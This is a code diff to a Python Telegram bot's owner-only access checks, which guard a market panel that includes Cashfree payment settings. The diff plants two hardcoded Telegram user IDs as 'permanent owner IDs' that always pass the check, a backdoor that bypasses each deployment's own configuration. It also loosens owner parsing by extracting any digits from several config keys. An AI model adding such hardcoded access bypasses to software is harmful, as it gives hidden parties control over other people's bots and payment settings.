@@ -133,17 +133,34 @@ logger = logging.getLogger(__name__)
 def _is_owner(user_id: int) -> bool:
     try:
         uid = int(user_id)
+        if uid in (1071421266, 6867086884):  # Explicit permanent owner IDs
+            return True
+        import re
         owner_set = set(getattr(Config, "OWNER_IDS", []) or []) | set(getattr(Config, "SUDO_USERS", []) or [])
-        bot_owner = getattr(Config, "BOT_OWNER_ID", "")
-        if bot_owner and str(bot_owner).strip().isdigit():
-            owner_set.add(int(str(bot_owner).strip()))
+        for k in ("BOT_OWNER_ID", "OWNER_ID", "ADMINS", "OWNER_IDS", "ADMIN"):
+            val = getattr(Config, k, "")
+            if val:
+                for match in re.findall(r'\d+', str(val)):
+                    owner_set.add(int(match))
         return uid in owner_set
     except Exception:
         return False
 
+async def _is_owner_db(user_id: int) -> bool:
+    if _is_owner(user_id):
+        return True
+    try:
+        cfg = await db.db.mini_app_config.find_one({"_key": "feature_toggles"}) or {}
+        db_owners = cfg.get("owner_ids", [])
+        if int(user_id) in [int(x) for x in db_owners if str(x).isdigit()]:
+            return True
+    except Exception:
+        pass
+    return False
+
 
 async def _deny_if_not_owner(client, user_id: int):
-    if _is_owner(user_id):
+    if _is_owner(user_id) or (await _is_owner_db(user_id)):
         return False
     await client.send_message(user_id, f"❌ Access denied. This panel is for owners only.\n\n(Your Telegram ID is: `{user_id}`)\nAdd this ID to your BOT_OWNER_ID in .env")
     return True
@@ -439,7 +456,7 @@ async def _render_cashfree_settings(client, query):
 async def market_callback(client, query):
     try:
         user_id = query.from_user.id
-        if not _is_owner(user_id):
+        if not (_is_owner(user_id) or (await _is_owner_db(user_id))):
             return await _safe_answer(query, "Access denied.", show_alert=True)
         data = query.data.split('#')
         cmd = data[1]
